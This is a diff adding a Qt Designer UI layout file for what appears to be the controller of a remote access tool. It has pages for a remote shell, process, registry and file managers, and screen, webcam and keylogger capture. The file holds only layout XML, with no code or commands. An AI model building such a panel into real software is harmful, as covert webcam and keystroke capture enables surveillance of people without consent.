@@ -1,0 +1,947 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<ui version="4.0">
+ <class>Form</class>
+ <widget class="QMainWindow" name="Form">
+  <property name="geometry">
+   <rect>
+    <x>0</x>
+    <y>0</y>
+    <width>1087</width>
+    <height>549</height>
+   </rect>
+  </property>
+  <property name="windowTitle">
+   <string>Form</string>
+  </property>
+  <property name="windowIcon">
+   <iconset resource="u3h.qrc">
+    <normaloff>:/u3H/u3hrsc/Acidrums4-Betelgeuse-Apps-rekonq.ico</normaloff>:/u3H/u3hrsc/Acidrums4-Betelgeuse-Apps-rekonq.ico</iconset>
+  </property>
+  <widget class="QWidget" name="centralWidget">
+   <layout class="QGridLayout" name="gridLayout">
+    <property name="leftMargin">
+     <number>0</number>
+    </property>
+    <property name="topMargin">
+     <number>0</number>
+    </property>
+    <property name="rightMargin">
+     <number>0</number>
+    </property>
+    <property name="bottomMargin">
+     <number>0</number>
+    </property>
+    <item row="0" column="0">
+     <widget class="QSplitter" name="splitter">
+      <property name="lineWidth">
+       <number>1</number>
+      </property>
+      <property name="orientation">
+       <enum>Qt::Horizontal</enum>
+      </property>
+      <property name="handleWidth">
+       <number>2</number>
+      </property>
+      <widget class="QTreeWidget" name="treeWidget_selectPages">
+       <property name="sizePolicy">
+        <sizepolicy hsizetype="Preferred" vsizetype="Expanding">
+         <horstretch>0</horstretch>
+         <verstretch>0</verstretch>
+        </sizepolicy>
+       </property>
+       <property name="baseSize">
+        <size>
+         <width>200</width>
+         <height>0</height>
+        </size>
+       </property>
+       <property name="styleSheet">
+        <string notr="true"/>
+       </property>
+       <property name="indentation">
+        <number>20</number>
+       </property>
+       <attribute name="headerVisible">
+        <bool>false</bool>
+       </attribute>
+       <column>
+        <property name="text">
+         <string notr="true">#</string>
+        </property>
+       </column>
+       <item>
+        <property name="text">
+         <string>Client</string>
+        </property>
+        <property name="icon">
+         <iconset resource="u3hClientForm.qrc">
+          <normaloff>:/u3hClientForm/u3hClientFormrsc/information.png</normaloff>:/u3hClientForm/u3hClientFormrsc/information.png</iconset>
+        </property>
+        <item>
+         <property name="text">
+          <string>Configuration</string>
+         </property>
+         <property name="icon">
+          <iconset resource="u3h.qrc">
+           <normaloff>:/u3H/u3hrsc/setting_tools.png</normaloff>:/u3H/u3hrsc/setting_tools.png</iconset>
+         </property>
+        </item>
+       </item>
+       <item>
+        <property name="text">
+         <string>Manage</string>
+        </property>
+        <property name="icon">
+         <iconset resource="u3hClientForm.qrc">
+          <normaloff>:/u3hClientForm/u3hClientFormrsc/computer.png</normaloff>:/u3hClientForm/u3hClientFormrsc/computer.png</iconset>
+        </property>
+        <item>
+         <property name="text">
+          <string>Remote Shell</string>
+         </property>
+         <property name="icon">
+          <iconset resource="u3hClientForm.qrc">
+           <normaloff>:/u3hClientForm/u3hClientFormrsc/application_osx_terminal.png</normaloff>:/u3hClientForm/u3hClientFormrsc/application_osx_terminal.png</iconset>
+         </property>
+        </item>
+        <item>
+         <property name="text">
+          <string>Process</string>
+         </property>
+         <property name="icon">
+          <iconset resource="u3hClientForm.qrc">
+           <normaloff>:/u3hClientForm/u3hClientFormrsc/process.png</normaloff>:/u3hClientForm/u3hClientFormrsc/process.png</iconset>
+         </property>
+        </item>
+        <item>
+         <property name="text">
+          <string>Registry</string>
+         </property>
+         <property name="icon">
+          <iconset resource="u3hClientForm.qrc">
+           <normaloff>:/u3hClientForm/u3hClientFormrsc/registry_editor.png</normaloff>:/u3hClientForm/u3hClientFormrsc/registry_editor.png</iconset>
+         </property>
+        </item>
+        <item>
+         <property name="text">
+          <string>Filesystem</string>
+         </property>
+         <property name="icon">
+          <iconset resource="u3hClientForm.qrc">
+           <normaloff>:/u3hClientForm/u3hClientFormrsc/opened_folder-48.png</normaloff>:/u3hClientForm/u3hClientFormrsc/opened_folder-48.png</iconset>
+         </property>
+        </item>
+       </item>
+       <item>
+        <property name="text">
+         <string>Capture</string>
+        </property>
+        <property name="icon">
+         <iconset resource="u3hClientForm.qrc">
+          <normaloff>:/u3hClientForm/u3hClientFormrsc/search_accounts.png</normaloff>:/u3hClientForm/u3hClientFormrsc/search_accounts.png</iconset>
+        </property>
+        <item>
+         <property name="text">
+          <string>Screen</string>
+         </property>
+         <property name="icon">
+          <iconset resource="u3hClientForm.qrc">
+           <normaloff>:/u3hClientForm/u3hClientFormrsc/screen_error.png</normaloff>:/u3hClientForm/u3hClientFormrsc/screen_error.png</iconset>
+         </property>
+        </item>
+        <item>
+         <property name="text">
+          <string>Webcam</string>
+         </property>
+         <property name="icon">
+          <iconset resource="u3hClientForm.qrc">
+           <normaloff>:/u3hClientForm/u3hClientFormrsc/webcam.png</normaloff>:/u3hClientForm/u3hClientFormrsc/webcam.png</iconset>
+         </property>
+        </item>
+        <item>
+         <property name="text">
+          <string>Keylogger</string>
+         </property>
+         <property name="icon">
+          <iconset resource="u3hClientForm.qrc">
+           <normaloff>:/u3hClientForm/u3hClientFormrsc/keyboard.png</normaloff>:/u3hClientForm/u3hClientFormrsc/keyboard.png</iconset>
+         </property>
+        </item>
+       </item>
+      </widget>
+      <widget class="QStackedWidget" name="stackedWidget">
+       <property name="sizePolicy">
+        <sizepolicy hsizetype="Preferred" vsizetype="Preferred">
+         <horstretch>4</horstretch>
+         <verstretch>0</verstretch>
+        </sizepolicy>
+       </property>
+       <property name="baseSize">
+        <size>
+         <width>460</width>
+         <height>0</height>
+        </size>
+       </property>
+       <property name="currentIndex">
+        <number>0</number>
+       </property>
+       <widget class="QWidget" name="page_blank"/>
+       <widget class="QWidget" name="page_remoteShell">
+        <layout class="QGridLayout" name="gridLayout_3">
+         <property name="leftMargin">
+          <number>0</number>
+         </property>
+         <property name="topMargin">
+          <number>0</number>
+         </property>
+         <property name="rightMargin">
+          <number>0</number>
+         </property>
+         <property name="bottomMargin">
+          <number>0</number>
+         </property>
+         <item row="0" column="0">
+          <widget class="QTabWidget" name="tabWidget">
+           <property name="tabPosition">
+            <enum>QTabWidget::South</enum>
+           </property>
+           <property name="currentIndex">
+            <number>0</number>
+           </property>
+           <widget class="QWidget" name="tab">
+            <attribute name="title">
+             <string>Interactive Shell</string>
+            </attribute>
+            <layout class="QGridLayout" name="gridLayout_2">
+             <item row="1" column="0">
+              <widget class="QLineEdit" name="lineEdit_remoteShell_sendCmd"/>
+             </item>
+             <item row="1" column="1">
+              <widget class="QPushButton" name="pushButton_remoteShell_sendCommand">
+               <property name="text">
+                <string>Send</string>
+               </property>
+              </widget>
+             </item>
+             <item row="0" column="0" colspan="2">
+              <widget class="QTextEdit" name="textEdit_remoteShell_cmdView"/>
+             </item>
+            </layout>
+           </widget>
+           <widget class="QWidget" name="tab_2">
+            <attribute name="title">
+             <string>System Command</string>
+            </attribute>
+            <widget class="QLineEdit" name="lineEdit">
+             <property name="geometry">
+              <rect>
+               <x>10</x>
+               <y>10</y>
+               <width>311</width>
+               <height>21</height>
+              </rect>
+             </property>
+            </widget>
+            <widget class="QPushButton" name="pushButton_remoteshell_executeSys">
+             <property name="geometry">
+              <rect>
+               <x>330</x>
+               <y>10</y>
+               <width>101</width>
+               <height>21</height>
+              </rect>
+             </property>
+             <property name="text">
+              <string>Execute</string>
+             </property>
+            </widget>
+            <widget class="QLabel" name="label_7">
+             <property name="geometry">
+              <rect>
+               <x>10</x>
+               <y>40</y>
+               <width>71</width>
+               <height>21</height>
+              </rect>
+             </property>
+             <property name="text">
+              <string>Return Code:</string>
+             </property>
+            </widget>
+            <widget class="QLabel" name="label_remoteshell_syscmd_returncode">
+             <property name="geometry">
+              <rect>
+               <x>80</x>
+               <y>40</y>
+               <width>47</width>
+               <height>21</height>
+              </rect>
+             </property>
+             <property name="text">
+              <string>0</string>
+             </property>
+            </widget>
+           </widget>
+          </widget>
+         </item>
+        </layout>
+       </widget>
+       <widget class="QWidget" name="page_client">
+        <widget class="QGroupBox" name="groupBox">
+         <property name="geometry">
+          <rect>
+           <x>20</x>
+           <y>10</y>
+           <width>261</width>
+           <height>141</height>
+          </rect>
+         </property>
+         <property name="title">
+          <string>Computer</string>
+         </property>
+         <widget class="QLabel" name="label_8">
+          <property name="geometry">
+           <rect>
+            <x>20</x>
+            <y>20</y>
+            <width>71</width>
+            <height>21</height>
+           </rect>
+          </property>
+          <property name="text">
+           <string>Hostname</string>
+          </property>
+         </widget>
+         <widget class="QLabel" name="label_9">
+          <property name="geometry">
+           <rect>
+            <x>20</x>
+            <y>40</y>
+            <width>71</width>
+            <height>21</height>
+           </rect>
+          </property>
+          <property name="text">
+           <string>Domain</string>
+          </property>
+         </widget>
+         <widget class="QLabel" name="label_10">
+          <property name="geometry">
+           <rect>
+            <x>20</x>
+            <y>60</y>
+            <width>101</width>
+            <height>21</height>
+           </rect>
+          </property>
+          <property name="text">
+           <string>Operating system</string>
+          </property>
+         </widget>
+         <widget class="QLabel" name="label_11">
+          <property name="geometry">
+           <rect>
+            <x>20</x>
+            <y>80</y>
+            <width>41</width>
+            <height>21</height>
+           </rect>
+          </property>
+          <property name="text">
+           <string>CPU</string>
+          </property>
+         </widget>
+         <widget class="QLabel" name="label_12">
+          <property name="geometry">
+           <rect>
+            <x>20</x>
+            <y>100</y>
+            <width>51</width>
+            <height>21</height>
+           </rect>
+          </property>
+          <property name="text">
+           <string>Memory</string>
+          </property>
+         </widget>
+        </widget>
+       </widget>
+       <widget class="QWidget" name="page_processManager">
+        <layout class="QGridLayout" name="gridLayout_7">
+         <property name="leftMargin">
+          <number>0</number>
+         </property>
+         <property name="topMargin">
+          <number>0</number>
+         </property>
+         <property name="rightMargin">
+          <number>0</number>
+         </property>
+         <property name="bottomMargin">
+          <number>0</number>
+         </property>
+         <item row="0" column="0">
+          <widget class="QSplitter" name="splitter_2">
+           <property name="sizePolicy">
+            <sizepolicy hsizetype="Preferred" vsizetype="Expanding">
+             <horstretch>0</horstretch>
+             <verstretch>0</verstretch>
+            </sizepolicy>
+           </property>
+           <property name="orientation">
+            <enum>Qt::Vertical</enum>
+           </property>
+           <widget class="QTreeWidget" name="treeWidget_process">
+            <property name="sortingEnabled">
+             <bool>true</bool>
+            </property>
+            <property name="animated">
+             <bool>true</bool>
+            </property>
+            <attribute name="headerDefaultSectionSize">
+             <number>300</number>
+            </attribute>
+            <column>
+             <property name="text">
+              <string>Image Name</string>
+             </property>
+            </column>
+            <column>
+             <property name="text">
+              <string>Username</string>
+             </property>
+            </column>
+            <column>
+             <property name="text">
+              <string>Pid</string>
+             </property>
+            </column>
+            <column>
+             <property name="text">
+              <string>Memory</string>
+             </property>
+            </column>
+            <column>
+             <property name="text">
+              <string>Description</string>
+             </property>
+            </column>
+           </widget>
+           <widget class="QTabWidget" name="tabWidget_processMgr_procInfos">
+            <property name="currentIndex">
+             <number>0</number>
+            </property>
+            <widget class="QWidget" name="tab_processMgr_procInfos">
+             <attribute name="title">
+              <string>Process Informations</string>
+             </attribute>
+             <layout class="QGridLayout" name="gridLayout_4">
+              <property name="leftMargin">
+               <number>0</number>
+              </property>
+              <property name="topMargin">
+               <number>0</number>
+              </property>
+              <property name="rightMargin">
+               <number>0</number>
+              </property>
+              <property name="bottomMargin">
+               <number>0</number>
+              </property>
+              <item row="1" column="0" rowspan="2">
+               <layout class="QGridLayout" name="gridLayout_5">
+                <property name="sizeConstraint">
+                 <enum>QLayout::SetFixedSize</enum>
+                </property>
+                <item row="3" column="1">
+                 <widget class="QLabel" name="label_processmgr_pid">
+                  <property name="text">
+                   <string/>
+                  </property>
+                 </widget>
+                </item>
+                <item row="0" column="0">
+                 <widget class="QLabel" name="label">
+                  <property name="text">
+                   <string>Description</string>
+                  </property>
+                 </widget>
+                </item>
+                <item row="5" column="1">
+                 <widget class="QLabel" name="label_processmgr_user">
+                  <property name="text">
+                   <string/>
+                  </property>
+                 </widget>
+                </item>
+                <item row="1" column="0">
+                 <widget class="QLabel" name="label_2">
+                  <property name="sizePolicy">
+                   <sizepolicy hsizetype="Fixed" vsizetype="Preferred">
+                    <horstretch>0</horstretch>
+                    <verstretch>0</verstretch>
+                   </sizepolicy>
+                  </property>
+                  <property name="minimumSize">
+                   <size>
+                    <width>100</width>
+                    <height>0</height>
+                   </size>
+                  </property>
+                  <property name="text">
+                   <string>Version</string>
+                  </property>
+                 </widget>
+                </item>
+                <item row="4" column="0">
+                 <widget class="QLabel" name="label_5">
+                  <property name="text">
+                   <string>Parent PID</string>
+                  </property>
+                 </widget>
+                </item>
+                <item row="0" column="1">
+                 <widget class="QLabel" name="label_processmgr_description">
+                  <property name="sizePolicy">
+                   <sizepolicy hsizetype="Fixed" vsizetype="Preferred">
+                    <horstretch>0</horstretch>
+                    <verstretch>0</verstretch>
+                   </sizepolicy>
+                  </property>
+                  <property name="minimumSize">
+                   <size>
+                    <width>250</width>
+                    <height>0</height>
+                   </size>
+                  </property>
+                  <property name="text">
+                   <string/>
+                  </property>
+                 </widget>
+                </item>
+                <item row="2" column="1">
+                 <widget class="QLabel" name="label_processmgr_cmdline">
+                  <property name="text">
+                   <string/>
+                  </property>
+                 </widget>
+                </item>
+                <item row="3" column="0">
+                 <widget class="QLabel" name="label_4">
+                  <property name="text">
+                   <string>PID</string>
+                  </property>
+                 </widget>
+                </item>
+                <item row="2" column="0">
+                 <widget class="QLabel" name="label_3">
+                  <property name="text">
+                   <string>Command Line</string>
+                  </property>
+                 </widget>
+                </item>
+                <item row="1" column="1">
+                 <widget class="QLabel" name="label_processmsgr_version">
+                  <property name="text">
+                   <string/>
+                  </property>
+                 </widget>
+                </item>
+                <item row="5" column="0">
+                 <widget class="QLabel" name="label_6">
+                  <property name="text">
+                   <string>User</string>
+                  </property>
+                 </widget>
+                </item>
+                <item row="4" column="1">
+                 <widget class="QLabel" name="label_processmgr_parentpid">
+                  <property name="text">
+                   <string/>
+                  </property>
+                 </widget>
+                </item>
+               </layout>
+              </item>
+              <item row="1" column="1">
+               <spacer name="horizontalSpacer">
+                <property name="orientation">
+                 <enum>Qt::Horizontal</enum>
+                </property>
+                <property name="sizeHint" stdset="0">
+                 <size>
+                  <width>40</width>
+                  <height>20</height>
+                 </size>
+                </property>
+               </spacer>
+              </item>
+              <item row="0" column="0">
+               <spacer name="verticalSpacer">
+                <property name="orientation">
+                 <enum>Qt::Vertical</enum>
+                </property>
+                <property name="sizeType">
+                 <enum>QSizePolicy::MinimumExpanding</enum>
+                </property>
+                <property name="sizeHint" stdset="0">
+                 <size>
+                  <width>20</width>
+                  <height>5</height>
+                 </size>
+                </property>
+               </spacer>
+              </item>
+             </layout>
+            </widget>
+            <widget class="QWidget" name="tab_processMgr_modules">
+             <attribute name="title">
+              <string>Modules</string>
+             </attribute>
+             <layout class="QGridLayout" name="gridLayout_6">
+              <item row="0" column="0">
+               <widget class="QTreeWidget" name="treeWidget_procInfos">
+                <attribute name="headerDefaultSectionSize">
+                 <number>180</number>
+                </attribute>
+                <column>
+                 <property name="text">
+                  <string>Name</string>
+                 </property>
+                </column>
+                <column>
+                 <property name="text">
+                  <string>Base</string>
+                 </property>
+                </column>
+                <column>
+                 <property name="text">
+                  <string>Size</string>
+                 </property>
+                </column>
+               </widget>
+              </item>
+             </layout>
+            </widget>
+           </widget>
+          </widget>
+         </item>
+        </layout>
+       </widget>
+       <widget class="QWidget" name="page_filesManager">
+        <layout class="QGridLayout" name="gridLayout_10">
+         <property name="leftMargin">
+          <number>0</number>
+         </property>
+         <property name="topMargin">
+          <number>0</number>
+         </property>
+         <property name="rightMargin">
+          <number>0</number>
+         </property>
+         <property name="bottomMargin">
+          <number>0</number>
+         </property>
+         <item row="0" column="0">
+          <widget class="QTabWidget" name="tabWidget_filesManager">
+           <property name="tabPosition">
+            <enum>QTabWidget::South</enum>
+           </property>
+           <property name="currentIndex">
+            <number>0</number>
+           </property>
+           <widget class="QWidget" name="tab_3">
+            <attribute name="title">
+             <string>Browser</string>
+            </attribute>
+            <layout class="QGridLayout" name="gridLayout_8">
+             <property name="leftMargin">
+              <number>0</number>
+             </property>
+             <property name="topMargin">
+              <number>0</number>
+             </property>
+             <property name="rightMargin">
+              <number>0</number>
+             </property>
+             <property name="bottomMargin">
+              <number>0</number>
+             </property>
+             <item row="0" column="0">
+              <widget class="QSplitter" name="splitter_3">
+               <property name="orientation">
+                <enum>Qt::Horizontal</enum>
+               </property>
+               <widget class="QTreeWidget" name="treeWidget_filesManager_dirs">
+                <property name="headerHidden">
+                 <bool>true</bool>
+                </property>
+                <column>
+                 <property name="text">
+                  <string/>
+                 </property>
+                </column>
+               </widget>
+               <widget class="QTreeWidget" name="treeWidget_filesManager_files">
+                <property name="contextMenuPolicy">
+                 <enum>Qt::CustomContextMenu</enum>
+                </property>
+                <property name="sortingEnabled">
+                 <bool>true</bool>
+                </property>
+                <property name="animated">
+                 <bool>true</bool>
+                </property>
+                <attribute name="headerDefaultSectionSize">
+                 <number>150</number>
+                </attribute>
+                <column>
+                 <property name="text">
+                  <string>Name</string>
+                 </property>
+                </column>
+                <column>
+                 <property name="text">
+                  <string>Size</string>
+                 </property>
+                </column>
+               </widget>
+              </widget>
+             </item>
+            </layout>
+           </widget>
+           <widget class="QWidget" name="tab_4">
+            <attribute name="title">
+             <string>Search </string>
+            </attribute>
+           </widget>
+          </widget>
+         </item>
+        </layout>
+       </widget>
+       <widget class="QWidget" name="page_capture_screen">
+        <layout class="QGridLayout" name="gridLayout_9">
+         <property name="leftMargin">
+          <number>0</number>
+         </property>
+         <property name="topMargin">
+          <number>0</number>
+         </property>
+         <property name="rightMargin">
+          <number>0</number>
+         </property>
+         <property name="bottomMargin">
+          <number>6</number>
+         </property>
+         <item row="1" column="1">
+          <widget class="QPushButton" name="pushButton_capture_screen_capture">
+           <property name="sizePolicy">
+            <sizepolicy hsizetype="Fixed" vsizetype="Fixed">
+             <horstretch>0</horstretch>
+             <verstretch>0</verstretch>
+            </sizepolicy>
+           </property>
+           <property name="text">
+            <string>Capture</string>
+           </property>
+          </widget>
+         </item>
+         <item row="1" column="2">
+          <widget class="QCheckBox" name="checkBox_capture_screen_saveframes">
+           <property name="text">
+            <string>Save frames</string>
+           </property>
+          </widget>
+         </item>
+         <item row="1" column="0">
+          <widget class="QPushButton" name="pushButton_CaptureScreen_Settings">
+           <property name="text">
+            <string>Settings</string>
+           </property>
+          </widget>
+         </item>
+         <item row="1" column="3">
+          <spacer name="horizontalSpacer_2">
+           <property name="orientation">
+            <enum>Qt::Horizontal</enum>
+           </property>
+           <property name="sizeHint" stdset="0">
+            <size>
+             <width>40</width>
+             <height>20</height>
+            </size>
+           </property>
+          </spacer>
+         </item>
+         <item row="0" column="0" colspan="4">
+          <widget class="uQLabel" name="label_capture_screen_view">
+           <property name="text">
+            <string/>
+           </property>
+          </widget>
+         </item>
+        </layout>
+       </widget>
+       <widget class="QWidget" name="page_capture_webcam"/>
+       <widget class="QWidget" name="page_capture_keylogger"/>
+       <widget class="QWidget" name="page_config_client"/>
+       <widget class="QWidget" name="page_registryManager">
+        <layout class="QGridLayout" name="gridLayout_11">
+         <property name="leftMargin">
+          <number>0</number>
+         </property>
+         <property name="topMargin">
+          <number>0</number>
+         </property>
+         <property name="rightMargin">
+          <number>0</number>
+         </property>
+         <property name="bottomMargin">
+          <number>0</number>
+         </property>
+         <item row="0" column="0">
+          <widget class="QTabWidget" name="tabWidget_registryManager">
+           <property name="tabPosition">
+            <enum>QTabWidget::South</enum>
+           </property>
+           <property name="currentIndex">
+            <number>0</number>
+           </property>
+           <widget class="QWidget" name="tab_rm_browser">
+            <attribute name="title">
+             <string>Browser</string>
+            </attribute>
+            <layout class="QGridLayout" name="gridLayout_12">
+             <property name="leftMargin">
+              <number>0</number>
+             </property>
+             <property name="topMargin">
+              <number>0</number>
+             </property>
+             <property name="rightMargin">
+              <number>0</number>
+             </property>
+             <property name="bottomMargin">
+              <number>0</number>
+             </property>
+             <item row="0" column="0">
+              <widget class="QSplitter" name="splitter_4">
+               <property name="orientation">
+                <enum>Qt::Horizontal</enum>
+               </property>
+               <widget class="QTreeWidget" name="treeWidget_registryNodes">
+                <property name="headerHidden">
+                 <bool>true</bool>
+                </property>
+                <column>
+                 <property name="text">
+                  <string notr="true">1</string>
+                 </property>
+                </column>
+                <item>
+                 <property name="text">
+                  <string>Computer</string>
+                 </property>
+                 <property name="icon">
+                  <iconset resource="u3hClientForm.qrc">
+                   <normaloff>:/u3hClientForm/u3hClientFormrsc/computer.png</normaloff>:/u3hClientForm/u3hClientFormrsc/computer.png</iconset>
+                 </property>
+                 <item>
+                  <property name="text">
+                   <string>HKEY_CLASSES_ROOT</string>
+                  </property>
+                  <property name="icon">
+                   <iconset resource="u3hClientForm.qrc">
+                    <normaloff>:/u3hClientForm/u3hClientFormrsc/folder.png</normaloff>:/u3hClientForm/u3hClientFormrsc/folder.png</iconset>
+                  </property>
+                 </item>
+                 <item>
+                  <property name="text">
+                   <string>HKEY_CURRENT_USER</string>
+                  </property>
+                  <property name="icon">
+                   <iconset resource="u3hClientForm.qrc">
+                    <normaloff>:/u3hClientForm/u3hClientFormrsc/folder.png</normaloff>:/u3hClientForm/u3hClientFormrsc/folder.png</iconset>
+                  </property>
+                 </item>
+                 <item>
+                  <property name="text">
+                   <string>HKEY_LOCAL_MACHINE</string>
+                  </property>
+                  <property name="icon">
+                   <iconset resource="u3hClientForm.qrc">
+                    <normaloff>:/u3hClientForm/u3hClientFormrsc/folder.png</normaloff>:/u3hClientForm/u3hClientFormrsc/folder.png</iconset>
+                  </property>
+                 </item>
+                 <item>
+                  <property name="text">
+                   <string>HKEY_USERS</string>
+                  </property>
+                  <property name="icon">
+                   <iconset resource="u3hClientForm.qrc">
+                    <normaloff>:/u3hClientForm/u3hClientFormrsc/folder.png</normaloff>:/u3hClientForm/u3hClientFormrsc/folder.png</iconset>
+                  </property>
+                 </item>
+                 <item>
+                  <property name="text">
+                   <string>HKEY_CURRENT_CONFIG</string>
+                  </property>
+                  <property name="icon">
+                   <iconset resource="u3hClientForm.qrc">
+                    <normaloff>:/u3hClientForm/u3hClientFormrsc/folder.png</normaloff>:/u3hClientForm/u3hClientFormrsc/folder.png</iconset>
+                  </property>
+                 </item>
+                </item>
+               </widget>
+               <widget class="QTreeWidget" name="treeWidget_registryKeys">
+                <attribute name="headerDefaultSectionSize">
+                 <number>150</number>
+                </attribute>
+                <column>
+                 <property name="text">
+                  <string>Name</string>
+                 </property>
+                </column>
+                <column>
+                 <property name="text">
+                  <string>Type</string>
+                 </property>
+                </column>
+                <column>
+                 <property name="text">
+                  <string>Value</string>
+                 </property>
+                </column>
+               </widget>
+              </widget>
+             </item>
+            </layout>
+           </widget>
+           <widget class="QWidget" name="tab_rm_search">
+            <attribute name="title">
+             <string>Search</string>
+            </attribute>
+           </widget>
+          </widget>
+         </item>
+        </layout>
+       </widget>
+      </widget>
+     </widget>
+    </item>
+   </layout>
+  </widget>
+ </widget>
+ <customwidgets>
+  <customwidget>
+   <class>uQLabel</class>
+   <extends>QLabel</extends>
+   <header>uQlabel.h</header>
+  </customwidget>
+ </customwidgets>
+ <resources>
+  <include location="u3hClientForm.qrc"/>
+  <include location="u3h.qrc"/>
+ </resources>
+ <connections/>
+</ui>
